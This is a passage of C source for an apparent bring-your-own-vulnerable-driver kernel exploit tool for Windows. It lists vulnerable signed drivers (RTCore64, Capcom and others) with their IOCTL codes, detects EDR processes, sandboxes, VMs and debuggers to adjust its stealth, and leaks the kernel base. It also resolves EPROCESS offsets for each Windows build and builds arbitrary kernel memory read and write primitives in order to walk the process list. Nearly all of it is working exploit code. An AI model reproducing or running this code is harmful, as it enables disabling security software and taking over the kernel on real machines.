    { L"RTCore64", L"\\\\.\\RTCore64", 0x80002048, 0x8000204C, 2019, L"MSI", FALSE },
    { L"Capcom", L"\\\\.\\Capcom", 0xAA012044, 0xAA012048, 2016, L"Capcom", FALSE },
    { L"GIGABYTE", L"\\\\.\\GIO", 0xDA880234, 0xDA880238, 2018, L"GIGABYTE", FALSE },
    { L"ASUSHWIO", L"\\\\.\\ASUSHWIO64", 0x80002010, 0x80002014, 2020, L"ASUS", FALSE },
    { L"EnTech", L"\\\\.\\EnTech", 0x9C402580, 0x9C402584, 2021, L"EnTech", FALSE }
};

#define DRIVER_COUNT (sizeof(g_vulnerable_drivers) / sizeof(DRIVER_INFO))

// Anti-analysis functions
BOOL DetectEDRPresence() {
    WCHAR* edr_processes[] = {
        L"crowdstrike.exe", L"csfalconservice.exe", L"sentinelagent.exe",
        L"cb.exe", L"carbonblack.exe", L"edrclient.exe",
        L"elasticendpoint.exe", L"mcafeeendpoint.exe", L"symantec.exe"
    };

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    BOOL found = FALSE;
    if (Process32FirstW(snapshot, &pe32)) {
        do {
            for (int i = 0; i < 9; i++) {
                if (_wcsicmp(pe32.szExeFile, edr_processes[i]) == 0) {
                    found = TRUE;
                    break;
                }
            }
        } while (Process32NextW(snapshot, &pe32) && !found);
    }

    CloseHandle(snapshot);
    return found;
}

BOOL CheckSandboxEnvironment() {
    // Check for sandbox artifacts
    WCHAR* sandbox_paths[] = {
        L"C:\\tools", L"C:\\analysis", L"C:\\sandbox",
        L"C:\\malware", L"C:\\virus", L"C:\\quarantine"
    };

    for (int i = 0; i < 6; i++) {
        if (PathFileExistsW(sandbox_paths[i])) {
            return TRUE;
        }
    }

    // Check for VM artifacts
    SYSTEM_INFO si;
    GetSystemInfo(&si);

    // VM CPUID checks
    int cpuid[4];
    __cpuid(cpuid, 1);
    if (cpuid[2] & 0x80000000) return TRUE;  // Hypervisor bit

    __cpuid(cpuid, 0x40000000);
    if (cpuid[0] >= 0x40000000) return TRUE;  // Hypervisor leaf

    return FALSE;
}

VOID InitializeAntiAnalysis() {
    g_anti_ctx.is_edr_present = DetectEDRPresence();
    g_anti_ctx.is_sandbox = CheckSandboxEnvironment();
    g_anti_ctx.is_vm = CheckSandboxEnvironment();

    // Check for debugger
    BOOL is_debugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &is_debugged);
    g_anti_ctx.is_debugger = is_debugged;

    // Set stealth level
    if (g_anti_ctx.is_edr_present) {
        g_anti_ctx.stealth_level = 3;
    } else if (g_anti_ctx.is_sandbox || g_anti_ctx.is_vm) {
        g_anti_ctx.stealth_level = 2;
    } else {
        g_anti_ctx.stealth_level = 1;
    }

    printf("[*] Anti-analysis assessment:\n");
    printf("    EDR Present: %s\n", g_anti_ctx.is_edr_present ? "YES" : "NO");
    printf("    Sandbox/VM: %s\n", (g_anti_ctx.is_sandbox || g_anti_ctx.is_vm) ? "YES" : "NO");
    printf("    Debugger: %s\n", g_anti_ctx.is_debugger ? "YES" : "NO");
    printf("    Stealth Level: %d\n\n", g_anti_ctx.stealth_level);
}

VOID EnumerateVulnerableDrivers() {
    printf("[*] Enumerating vulnerable drivers...\n");

    // Get loaded drivers
    LPVOID drivers[1024];
    DWORD bytes_needed;

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &bytes_needed)) {
        int driver_count = bytes_needed / sizeof(LPVOID);

        for (int i = 0; i < driver_count; i++) {
            WCHAR driver_name[MAX_PATH];
            if (GetDeviceDriverBaseNameW(drivers[i], driver_name, MAX_PATH)) {
                // Remove .sys extension for comparison
                WCHAR* dot = wcsrchr(driver_name, L'.');
                WCHAR name_without_ext[MAX_PATH];
                if (dot) {
                    wcsncpy_s(name_without_ext, MAX_PATH, driver_name, dot - driver_name);
                } else {
                    wcscpy_s(name_without_ext, MAX_PATH, driver_name);
                }

                // Check against vulnerable driver database
                for (int j = 0; j < DRIVER_COUNT; j++) {
                    if (_wcsicmp(name_without_ext, g_vulnerable_drivers[j].name) == 0) {
                        g_vulnerable_drivers[j].is_loaded = TRUE;
                        printf("[+] Found vulnerable driver: %ls (CVE-%d)\n",
                               driver_name, g_vulnerable_drivers[j].cve_year);
                        break;
                    }
                }
            }
        }
    }

    // Also try to open device directly as fallback detection
    for (int i = 0; i < DRIVER_COUNT; i++) {
        if (!g_vulnerable_drivers[i].is_loaded) {
            HANDLE hTest = CreateFileW(
                g_vulnerable_drivers[i].device_path,
                GENERIC_READ | GENERIC_WRITE,
                0, NULL, OPEN_EXISTING, 0, NULL
            );
            if (hTest != INVALID_HANDLE_VALUE) {
                g_vulnerable_drivers[i].is_loaded = TRUE;
                printf("[+] Found vulnerable driver via device: %ls (CVE-%d)\n",
                       g_vulnerable_drivers[i].name, g_vulnerable_drivers[i].cve_year);
                CloseHandle(hTest);
            }
        }
    }

    // Check for additional drivers via file system
    WCHAR system32[MAX_PATH];
    GetSystemDirectoryW(system32, MAX_PATH);
    wcscat_s(system32, MAX_PATH, L"\\drivers\\");

    for (int i = 0; i < DRIVER_COUNT; i++) {
        if (!g_vulnerable_drivers[i].is_loaded) {
            WCHAR driver_path[MAX_PATH];
            wcscpy_s(driver_path, MAX_PATH, system32);
            wcscat_s(driver_path, MAX_PATH, g_vulnerable_drivers[i].name);
            wcscat_s(driver_path, MAX_PATH, L".sys");

            if (PathFileExistsW(driver_path)) {
                printf("[!] Driver file exists but not loaded: %ls\n", g_vulnerable_drivers[i].name);
            }
        }
    }

    printf("\n");
}

typedef struct _EPROCESS_OFFSETS {
    ULONG UniqueProcessId;
    ULONG ActiveProcessLinks;
    ULONG ImageFileName;
    ULONG Protection;
    ULONG SignatureLevel;
    ULONG SectionSignatureLevel;
} EPROCESS_OFFSETS;

EPROCESS_OFFSETS g_eprocess_offsets = {0};

// Dynamic offset detection for different Windows versions
// Get real Windows version using RtlGetVersion (not shimmed like GetVersionEx)
typedef NTSTATUS (NTAPI *RtlGetVersion_t)(PRTL_OSVERSIONINFOW);

DWORD GetRealWindowsBuild() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return 0;

    RtlGetVersion_t pRtlGetVersion = (RtlGetVersion_t)GetProcAddress(hNtdll, "RtlGetVersion");
    if (!pRtlGetVersion) return 0;

    RTL_OSVERSIONINFOW osvi = { sizeof(osvi) };
    if (pRtlGetVersion(&osvi) == 0) {
        return osvi.dwBuildNumber;
    }
    return 0;
}

BOOL DetectEprocessOffsets() {
    printf("[*] Detecting EPROCESS offsets for current Windows build...\n");

    // Get real Windows version using RtlGetVersion (bypasses compatibility shim)
    DWORD build = GetRealWindowsBuild();
    if (build == 0) {
        // Fallback to registry
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                          L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                          0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            WCHAR buildStr[32];
            DWORD size = sizeof(buildStr);
            if (RegQueryValueExW(hKey, L"CurrentBuildNumber", NULL, NULL,
                                 (LPBYTE)buildStr, &size) == ERROR_SUCCESS) {
                build = _wtoi(buildStr);
            }
            RegCloseKey(hKey);
        }
    }

    printf("[*] Windows Build: %d\n", build);

    // EPROCESS offsets vary by Windows build
    // These are for 64-bit Windows. Verify with WinDbg: dt nt!_EPROCESS

    if (build >= 17763 && build < 18362) {
        // Windows 10 1809 (RS5)
        g_eprocess_offsets.UniqueProcessId = 0x2E8;
        g_eprocess_offsets.ActiveProcessLinks = 0x2F0;
        g_eprocess_offsets.ImageFileName = 0x450;
        g_eprocess_offsets.Protection = 0x6CA;
        g_eprocess_offsets.SignatureLevel = 0x6C8;
        g_eprocess_offsets.SectionSignatureLevel = 0x6C9;
    } else if (build >= 18362 && build < 18363) {
        // Windows 10 1903 (19H1)
        g_eprocess_offsets.UniqueProcessId = 0x2E8;
        g_eprocess_offsets.ActiveProcessLinks = 0x2F0;
        g_eprocess_offsets.ImageFileName = 0x450;
        g_eprocess_offsets.Protection = 0x6FA;
        g_eprocess_offsets.SignatureLevel = 0x6F8;
        g_eprocess_offsets.SectionSignatureLevel = 0x6F9;
    } else if (build >= 18363 && build < 19041) {
        // Windows 10 1909 (19H2)
        g_eprocess_offsets.UniqueProcessId = 0x2E8;
        g_eprocess_offsets.ActiveProcessLinks = 0x2F0;
        g_eprocess_offsets.ImageFileName = 0x450;
        g_eprocess_offsets.Protection = 0x6FA;
        g_eprocess_offsets.SignatureLevel = 0x6F8;
        g_eprocess_offsets.SectionSignatureLevel = 0x6F9;
    } else if (build >= 19041 && build < 22000) {
        // Windows 10 20H1/20H2/21H1/21H2/22H2 (builds 19041-19045)
        g_eprocess_offsets.UniqueProcessId = 0x440;
        g_eprocess_offsets.ActiveProcessLinks = 0x448;
        g_eprocess_offsets.ImageFileName = 0x5A8;
        g_eprocess_offsets.Protection = 0x87A;
        g_eprocess_offsets.SignatureLevel = 0x878;
        g_eprocess_offsets.SectionSignatureLevel = 0x879;
    } else if (build >= 22000 && build < 22621) {
        // Windows 11 21H2 (build 22000)
        g_eprocess_offsets.UniqueProcessId = 0x440;
        g_eprocess_offsets.ActiveProcessLinks = 0x448;
        g_eprocess_offsets.ImageFileName = 0x5A8;
        g_eprocess_offsets.Protection = 0x87A;
        g_eprocess_offsets.SignatureLevel = 0x878;
        g_eprocess_offsets.SectionSignatureLevel = 0x879;
    } else if (build >= 22621 && build < 26100) {
        // Windows 11 22H2/23H2 (builds 22621-22631)
        g_eprocess_offsets.UniqueProcessId = 0x440;
        g_eprocess_offsets.ActiveProcessLinks = 0x448;
        g_eprocess_offsets.ImageFileName = 0x5A8;
        g_eprocess_offsets.Protection = 0x87A;
        g_eprocess_offsets.SignatureLevel = 0x878;
        g_eprocess_offsets.SectionSignatureLevel = 0x879;
    } else if (build >= 26100) {
        g_eprocess_offsets.UniqueProcessId = 0x1D0;
        g_eprocess_offsets.ActiveProcessLinks = 0x1D8;
        g_eprocess_offsets.ImageFileName = 0x338;
        g_eprocess_offsets.Protection = 0x5FA;
        g_eprocess_offsets.SignatureLevel = 0x5F8;
        g_eprocess_offsets.SectionSignatureLevel = 0x5F9;
        printf("[*] Using Windows 11 24H2 Layout 1 offsets (build %d)\n", build);
        printf("[!] If this fails, the system may use Layout 2 (use WinDbg to verify)\n");
    } else {
        printf("[-] Unsupported Windows build: %d\n", build);
        printf("[!] Use WinDbg to find offsets: dt nt!_EPROCESS\n");
        printf("[!] Look for: UniqueProcessId, ActiveProcessLinks, Protection\n");
        return FALSE;
    }

    printf("[+] EPROCESS offsets detected:\n");
    printf("    UniqueProcessId: 0x%X\n", g_eprocess_offsets.UniqueProcessId);
    printf("    ActiveProcessLinks: 0x%X\n", g_eprocess_offsets.ActiveProcessLinks);
    printf("    Protection: 0x%X\n", g_eprocess_offsets.Protection);
    printf("\n");

    return TRUE;
}

// Kernel base leak via multiple methods
ULONG_PTR LeakKernelBase() {
    printf("[*] Attempting kernel base leak...\n");

    // Method 1: NtQuerySystemInformation
    typedef NTSTATUS (NTAPI *NtQuerySystemInformation_t)(
        ULONG SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
    );

    NtQuerySystemInformation_t NtQuerySystemInformation =
        (NtQuerySystemInformation_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");

    if (NtQuerySystemInformation) {
        typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
            HANDLE Section;
            PVOID  MappedBase;
            PVOID  ImageBase;
            ULONG  ImageSize;
            ULONG  Flags;
            USHORT LoadOrderIndex;
            USHORT InitOrderIndex;
            USHORT LoadCount;
            USHORT OffsetToFileName;
            CHAR   FullPathName[256];
        } SYSTEM_MODULE_INFORMATION_ENTRY;

        typedef struct _SYSTEM_MODULE_INFORMATION {
            ULONG Count;
            SYSTEM_MODULE_INFORMATION_ENTRY Modules[1];
        } SYSTEM_MODULE_INFORMATION;

        ULONG size = 0;
        NtQuerySystemInformation(11, NULL, 0, &size);

        if (size > 0) {
            SYSTEM_MODULE_INFORMATION* smi = (SYSTEM_MODULE_INFORMATION*)malloc(size);
            if (smi) {
                if (NT_SUCCESS(NtQuerySystemInformation(11, smi, size, &size))) {
                    // ntoskrnl.exe is always first module (index 0)
                    ULONG_PTR kernel_base = (ULONG_PTR)smi->Modules[0].ImageBase;
                    printf("[+] Kernel base leaked via NtQuerySystemInformation: 0x%llX\n", kernel_base);
                    free(smi);
                    return kernel_base;
                }
                free(smi);
            }
        }
    }

    // Method 2: EnumDeviceDrivers
    LPVOID drivers[1024];
    DWORD bytes_needed;

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &bytes_needed)) {
        // First driver is typically ntoskrnl.exe
        ULONG_PTR kernel_base = (ULONG_PTR)drivers[0];
        printf("[+] Kernel base leaked via EnumDeviceDrivers: 0x%llX\n", kernel_base);
        return kernel_base;
    }

    printf("[-] Failed to leak kernel base\n");
    return 0;
}

// RTCore64 memory read/write structure - MUST be 48 bytes!
typedef struct _RTCORE64_MEMORY {
    BYTE  Pad0[8];      // 8 bytes padding
    DWORD64 Address;    // 8 bytes - target address
    BYTE  Pad1[8];      // 8 bytes padding
    DWORD ReadSize;     // 4 bytes - size to read (1, 2, or 4)
    DWORD Value;        // 4 bytes - value read/write
    BYTE  Pad2[16];     // 16 bytes padding
} RTCORE64_MEMORY;
// Total: 8 + 8 + 8 + 4 + 4 + 16 = 48 bytes

// Verify structure size at compile time
#define STATIC_ASSERT(cond) typedef char static_assertion[(cond)?1:-1];
STATIC_ASSERT(sizeof(RTCORE64_MEMORY) == 48)

typedef struct _CAPCOM_IOCTL_REQUEST {
    ULONG_PTR TargetAddress;
    ULONG_PTR SourceAddress;
    SIZE_T Size;
} CAPCOM_IOCTL_REQUEST;

HANDLE OpenVulnerableDriver(int driver_index) {
    if (driver_index < 0 || driver_index >= DRIVER_COUNT) {
        return INVALID_HANDLE_VALUE;
    }

    DRIVER_INFO* driver = &g_vulnerable_drivers[driver_index];
    if (!driver->is_loaded) {
        printf("[-] Driver %ls is not loaded\n", driver->name);
        return INVALID_HANDLE_VALUE;
    }

    printf("[*] Opening driver: %ls\n", driver->name);

    HANDLE hDevice = CreateFileW(
        driver->device_path,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open %ls: %d\n", driver->name, GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    printf("[+] Successfully opened %ls\n", driver->name);
    return hDevice;
}

// Read DWORD from kernel memory using RTCore64
DWORD ReadKernelDWORD(HANDLE hDevice, DWORD ioctl, DWORD64 address) {
    // Validate address looks like kernel space (upper half of address space)
    // Windows uses canonical addresses: either 0x0000xxxxxxxxxxxx (user) or 0xFFFFxxxxxxxxxxxx (kernel)
    // Check if bit 47 is set (kernel space indicator)
    if ((address & 0xFFFF800000000000ULL) != 0xFFFF800000000000ULL) {
        printf("[-] Invalid kernel address in ReadKernelDWORD: 0x%llX\n", address);
        return 0;
    }

    RTCORE64_MEMORY mem = {0};
    mem.Address = address;
    mem.ReadSize = 4;

    DWORD bytes_returned = 0;
    BOOL result = DeviceIoControl(hDevice, ioctl, &mem, sizeof(mem), &mem, sizeof(mem), &bytes_returned, NULL);

    if (!result) {
        printf("[-] DeviceIoControl failed for address 0x%llX: %d\n", address, GetLastError());
        return 0;
    }

    return mem.Value;
}

// Read QWORD (8 bytes) from kernel memory using RTCore64
DWORD64 ReadKernelQWORD(HANDLE hDevice, DWORD ioctl, DWORD64 address) {
    // Validate address looks like kernel space
    if ((address & 0xFFFF800000000000ULL) != 0xFFFF800000000000ULL) {
        printf("[-] Invalid kernel address in ReadKernelQWORD: 0x%llX\n", address);
        return 0;
    }

    DWORD low = ReadKernelDWORD(hDevice, ioctl, address);
    DWORD high = ReadKernelDWORD(hDevice, ioctl, address + 4);
    return ((DWORD64)high << 32) | low;
}

BOOL ReadKernelMemory(HANDLE hDevice, int driver_index, ULONG_PTR address, PVOID buffer, SIZE_T size) {
    DRIVER_INFO* driver = &g_vulnerable_drivers[driver_index];
    DWORD bytes_returned;

    if (_wcsicmp(driver->name, L"RTCore64") == 0) {
        // RTCore64 can only read up to 4 bytes at a time
        BYTE* out_buffer = (BYTE*)buffer;
        ULONG_PTR current_addr = address;
        SIZE_T remaining = size;

        while (remaining > 0) {
            if (remaining >= 4) {
                DWORD val = ReadKernelDWORD(hDevice, driver->read_ioctl, current_addr);
                memcpy(out_buffer, &val, 4);
                out_buffer += 4;
                current_addr += 4;
                remaining -= 4;
            } else {
                DWORD val = ReadKernelDWORD(hDevice, driver->read_ioctl, current_addr);
                memcpy(out_buffer, &val, remaining);
                remaining = 0;
            }
        }
        return TRUE;
    } else if (_wcsicmp(driver->name, L"Capcom") == 0) {
        CAPCOM_IOCTL_REQUEST request = {0};
        request.TargetAddress = address;
        request.SourceAddress = (ULONG_PTR)buffer;
        request.Size = size;

        return DeviceIoControl(hDevice, driver->read_ioctl,
                              &request, sizeof(request),
                              NULL, 0,
                              &bytes_returned, NULL);
    }

    return FALSE;
}

// Write DWORD to kernel memory using RTCore64
void WriteKernelDWORD(HANDLE hDevice, DWORD ioctl, DWORD64 address, DWORD value) {
    // Validate address looks like kernel space
    if ((address & 0xFFFF800000000000ULL) != 0xFFFF800000000000ULL) {
        printf("[-] Invalid kernel address in WriteKernelDWORD: 0x%llX\n", address);
        return;
    }

    // RTCore64 write structure is different from read!
    // For write IOCTL 0x8000204C, the structure is:
    // - Offset 0x00: padding (8 bytes)
    // - Offset 0x08: target address (8 bytes)
    // - Offset 0x10: padding (8 bytes)
    // - Offset 0x18: value to write (4 bytes)
    // - Offset 0x1C: write size (4 bytes) - must be 1, 2, or 4
    // - Offset 0x20: padding (16 bytes)

    RTCORE64_MEMORY mem = {0};
    mem.Address = address;
    mem.Value = value;
    mem.ReadSize = 4;  // Size to write

    DWORD bytes_returned = 0;
    BOOL result = DeviceIoControl(hDevice, ioctl, &mem, sizeof(mem), &mem, sizeof(mem), &bytes_returned, NULL);

    if (!result) {
        printf("[-] DeviceIoControl write failed for address 0x%llX: %d\n", address, GetLastError());
    }
}

BOOL WriteKernelMemory(HANDLE hDevice, int driver_index, ULONG_PTR address, PVOID buffer, SIZE_T size) {
    DRIVER_INFO* driver = &g_vulnerable_drivers[driver_index];
    DWORD bytes_returned;

    if (_wcsicmp(driver->name, L"RTCore64") == 0) {
        // Write in 4-byte chunks with validation
        BYTE* in_buffer = (BYTE*)buffer;
        ULONG_PTR current_addr = address;
        SIZE_T remaining = size;

        while (remaining > 0) {
            DWORD val = 0;
            SIZE_T to_write = (remaining >= 4) ? 4 : remaining;
            memcpy(&val, in_buffer, to_write);

            // Validate address before write
            if ((current_addr & 0xFFFF800000000000ULL) != 0xFFFF800000000000ULL) {
                printf("[-] Invalid kernel address: 0x%llX\n", current_addr);
                return FALSE;
            }

            // Read current value first to verify address is readable
            DWORD current_val = ReadKernelDWORD(hDevice, driver->read_ioctl, current_addr);
            printf("[*] Address 0x%llX: current=0x%08X, writing=0x%08X\n",
                   current_addr, current_val, val);

            WriteKernelDWORD(hDevice, driver->write_ioctl, current_addr, val);

            // Verify write succeeded
            DWORD verify_val = ReadKernelDWORD(hDevice, driver->read_ioctl, current_addr);
            if (verify_val != val) {
                printf("[-] Write verification failed at 0x%llX: expected 0x%08X, got 0x%08X\n",
                       current_addr, val, verify_val);
                return FALSE;
            }

            in_buffer += to_write;
            current_addr += to_write;
            remaining -= to_write;
        }
        return TRUE;
    } else if (_wcsicmp(driver->name, L"Capcom") == 0) {
        CAPCOM_IOCTL_REQUEST request = {0};
        request.TargetAddress = address;
        request.SourceAddress = (ULONG_PTR)buffer;
        request.Size = size;

        return DeviceIoControl(hDevice, driver->write_ioctl,
                              &request, sizeof(request),
                              NULL, 0,
                              &bytes_returned, NULL);
    }

    return FALSE;
}

// Get kernel symbol address by loading ntoskrnl.exe in usermode
ULONG_PTR GetKernelSymbol(ULONG_PTR kernel_base, const char* symbol_name) {
    HMODULE hNtos = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hNtos) {
        return 0;
    }

    PVOID pUserAddr = GetProcAddress(hNtos, symbol_name);
    if (!pUserAddr) {
        FreeLibrary(hNtos);
        return 0;
    }

    ULONG_PTR rva = (ULONG_PTR)pUserAddr - (ULONG_PTR)hNtos;
    FreeLibrary(hNtos);

    return kernel_base + rva;
}

// Test if RTCore64 read is working
BOOL TestKernelRead(HANDLE hDevice, int driver_index) {
    DRIVER_INFO* driver = &g_vulnerable_drivers[driver_index];
    DWORD bytes_returned = 0;

    // Simple test read using correct 48-byte structure
    RTCORE64_MEMORY request = {0};
    request.Address = 0xFFFFF80000000000ULL;  // Typical kernel address
    request.ReadSize = 4;

    BOOL result = DeviceIoControl(hDevice, driver->read_ioctl,
                                  &request, sizeof(request),
                                  &request, sizeof(request),
                                  &bytes_returned, NULL);

    printf("[DEBUG] Test IOCTL result: %d, bytes_returned: %d, GetLastError: %d\n",
           result, bytes_returned, GetLastError());
    printf("[DEBUG] request.Value: 0x%08X\n", request.Value);

    return result;
}

// Scan for PID offset by looking for value 4 (System process PID)
// Returns 0 if not found or if scan is disabled for safety
ULONG ScanForPidOffset(HANDLE hDevice, DWORD ioctl, DWORD64 eprocess_base) {
    printf("[*] Scanning for PID offset (looking for value 4)...\n");
    printf("[!] WARNING: Scanning can be dangerous - using known offsets first\n");

    // Validate EPROCESS base looks like kernel address
    if ((eprocess_base & 0xFFFF800000000000ULL) != 0xFFFF800000000000ULL) {
        printf("[-] Invalid EPROCESS base address: 0x%llX\n", eprocess_base);
        return 0;
    }

    // Known good offsets to check first (from Vergilius Project)
    // Order matters - try most common first
    ULONG known_offsets[] = {
        0x1D0,  // Win11 24H2 Layout 1
        0x440,  // Win11 24H2 Layout 2, Win10 20H1+
        0x2E8,  // Win10 1809-1909
        0x2E0,  // Win10 older
        0x448   // Alternative
    };
    int num_known = sizeof(known_offsets) / sizeof(known_offsets[0]);

    for (int i = 0; i < num_known; i++) {
        __try {
            DWORD value = ReadKernelDWORD(hDevice, ioctl, eprocess_base + known_offsets[i]);
            printf("    Offset 0x%X: value = %u (0x%X)\n", known_offsets[i], value, value);
            if (value == 4) {
                printf("[+] Found PID=4 at known offset 0x%X\n", known_offsets[i]);
                return known_offsets[i];
            }
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            printf("[-] Exception reading offset 0x%X\n", known_offsets[i]);
        }
    }

    printf("[-] PID not found at known offsets\n");
    printf("[!] NOT performing full scan to avoid potential crashes\n");
    printf("[!] Please verify offsets using WinDbg: dt nt!_EPROCESS\n");

    return 0;
}

// Scan for ActiveProcessLinks offset (look for valid kernel pointers)
ULONG ScanForLinksOffset(HANDLE hDevice, DWORD ioctl, DWORD64 eprocess_base, ULONG pid_offset) {
    printf("[*] Scanning for ActiveProcessLinks offset...\n");
    printf("[*] EPROCESS base: 0x%llX, PID offset: 0x%X\n", eprocess_base, pid_offset);

    // Known offsets for ActiveProcessLinks (typically PID offset + 8)
    ULONG known_links_offsets[] = {
        pid_offset + 8,  // Most common: right after UniqueProcessId
        0x1D8,  // Win11 24H2 Layout 1
        0x448,  // Win11 24H2 Layout 2, Win10 20H1+
        0x2F0,  // Win10 1809-1909
        0x2E8   // Win10 older
    };
    int num_known = sizeof(known_links_offsets) / sizeof(known_links_offsets[0]);

    for (int i = 0; i < num_known; i++) {
        ULONG offset = known_links_offsets[i];

        __try {
            DWORD64 flink = ReadKernelQWORD(hDevice, ioctl, eprocess_base + offset);

            // Validate it looks like a kernel pointer
            if ((flink & 0xFFFF800000000000ULL) != 0xFFFF800000000000ULL ||
                flink == 0xFFFFFFFFFFFFFFFFULL) {
                continue;
            }

            // Read Blink to verify it's a LIST_ENTRY
            DWORD64 blink = ReadKernelQWORD(hDevice, ioctl, eprocess_base + offset + 8);
            if ((blink & 0xFFFF800000000000ULL) != 0xFFFF800000000000ULL ||
                blink == 0xFFFFFFFFFFFFFFFFULL) {
                continue;
            }

            printf("    Testing offset 0x%X: Flink=0x%llX, Blink=0x%llX\n", offset, flink, blink);

            // Verify by following the link and checking PID
            DWORD64 next_eprocess = flink - offset;

            // Validate next EPROCESS address
            if ((next_eprocess & 0xFFFF800000000000ULL) != 0xFFFF800000000000ULL) {
                continue;
            }

            DWORD next_pid = ReadKernelDWORD(hDevice, ioctl, next_eprocess + pid_offset);

            if (next_pid > 0 && next_pid < 65536) {
                printf("[+] Found valid ActiveProcessLinks at offset 0x%X (next PID: %u)\n",
                       offset, next_pid);
                return offset;
            }
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            printf("[-] Exception testing offset 0x%X\n", offset);
        }
    }

    printf("[-] Could not find valid ActiveProcessLinks offset\n");
    return 0;
}

// Get PsActiveProcessHead - try multiple methods
ULONG_PTR GetPsActiveProcessHead(HANDLE hDevice, int driver_index, ULONG_PTR kernel_base) {
    DRIVER_INFO* driver = &g_vulnerable_drivers[driver_index];

    // Method 1: Try direct export (works on older Windows)
    ULONG_PTR ps_head = GetKernelSymbol(kernel_base, "PsActiveProcessHead");
    if (ps_head) {
        printf("[+] PsActiveProcessHead via export: 0x%llX\n", ps_head);
        return ps_head;
    }

    // Method 2: Use PsInitialSystemProcess (always exported)
    ULONG_PTR ps_initial = GetKernelSymbol(kernel_base, "PsInitialSystemProcess");
    if (ps_initial) {
        printf("[+] PsInitialSystemProcess address: 0x%llX\n", ps_initial);

        printf("[*] Reading System EPROCESS pointer...\n");

        __try {
            DWORD64 system_eprocess = ReadKernelQWORD(hDevice, driver->read_ioctl, ps_initial);

            // Validate the EPROCESS pointer looks reasonable
            if (system_eprocess == 0 || system_eprocess == 0xFFFFFFFFFFFFFFFF) {
                printf("[-] Invalid System EPROCESS pointer: 0x%llX\n", system_eprocess);
                return 0;
            }

            // Check it looks like a kernel address
            if ((system_eprocess & 0xFFFF800000000000ULL) != 0xFFFF800000000000ULL) {
                printf("[-] System EPROCESS doesn't look like kernel address: 0x%llX\n", system_eprocess);
                return 0;
            }

            printf("[+] System EPROCESS: 0x%llX\n", system_eprocess);

            // Try configured offset first
            printf("[*] Testing PID at offset 0x%X...\n", g_eprocess_offsets.UniqueProcessId);
            DWORD pid = ReadKernelDWORD(hDevice, driver->read_ioctl,
                                        system_eprocess + g_eprocess_offsets.UniqueProcessId);
            printf("[*] Value at offset 0x%X: %u (0x%X)\n",
                   g_eprocess_offsets.UniqueProcessId, pid, pid);

            if (pid == 4) {
                printf("[+] Verified System EPROCESS - PID matches!\n");

                // Also verify ActiveProcessLinks looks valid before using
                DWORD64 flink = ReadKernelQWORD(hDevice, driver->read_ioctl,
                                                system_eprocess + g_eprocess_offsets.ActiveProcessLinks);
                printf("[*] ActiveProcessLinks.Flink: 0x%llX\n", flink);

                if ((flink & 0xFFFF800000000000ULL) == 0xFFFF800000000000ULL &&
                    flink != 0xFFFFFFFFFFFFFFFFULL) {
                    printf("[+] ActiveProcessLinks looks valid\n");
                    return system_eprocess + g_eprocess_offsets.ActiveProcessLinks;
                } else {
                    printf("[-] ActiveProcessLinks doesn't look valid\n");
                }
            }

            // Offset wrong - try scanning known offsets only (safer)
            printf("[!] Configured offset wrong, trying known offsets...\n");
            ULONG found_pid_offset = ScanForPidOffset(hDevice, driver->read_ioctl, system_eprocess);

            if (found_pid_offset) {
                g_eprocess_offsets.UniqueProcessId = found_pid_offset;

                // Find ActiveProcessLinks offset
                ULONG found_links_offset = ScanForLinksOffset(hDevice, driver->read_ioctl,
                                                              system_eprocess, found_pid_offset);

                if (found_links_offset) {
                    g_eprocess_offsets.ActiveProcessLinks = found_links_offset;

                    // Protection offset varies by build - use conservative estimate
                    // Typically 0x200-0x900 bytes into structure
                    g_eprocess_offsets.Protection = 0x87A;  // Common for Win10/11

                    printf("[+] Updated offsets:\n");
                    printf("    UniqueProcessId: 0x%X\n", g_eprocess_offsets.UniqueProcessId);
                    printf("    ActiveProcessLinks: 0x%X\n", g_eprocess_offsets.ActiveProcessLinks);
                    printf("    Protection: 0x%X (estimated)\n", g_eprocess_offsets.Protection);

                    return system_eprocess + g_eprocess_offsets.ActiveProcessLinks;
                } else {
                    printf("[-] Could not find ActiveProcessLinks - aborting for safety\n");
                }
            }
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            printf("[-] Exception while reading System EPROCESS\n");
        }
    }

    printf("[-] Could not find process list head\n");
    printf("[!] This may require manual offset verification with WinDbg\n");
    return 0;
}

ULONG_PTR FindEprocessByPid(HANDLE hDevice, int driver_index, DWORD pid) {
    printf("[*] Finding EPROCESS for PID %d...\n", pid);

    // Get kernel base
    ULONG_PTR kernel_base = LeakKernelBase();
    if (kernel_base == 0) {
        return 0;
    }

    // Get process list starting point
    ULONG_PTR list_start = GetPsActiveProcessHead(hDevice, driver_index, kernel_base);
    if (list_start == 0) {
        printf("[-] Failed to find process list\n");
        return 0;
    }

    // Read the LIST_ENTRY at our starting point
    LIST_ENTRY head;
    if (!ReadKernelMemory(hDevice, driver_index, list_start, &head, sizeof(head))) {
        printf("[-] Failed to read process list\n");
        return 0;
    }

    // Walk the linked list
    ULONG_PTR current_entry = (ULONG_PTR)head.Flink;
    ULONG_PTR start_entry = current_entry;

    do {
        // Calculate EPROCESS base from ActiveProcessLinks offset
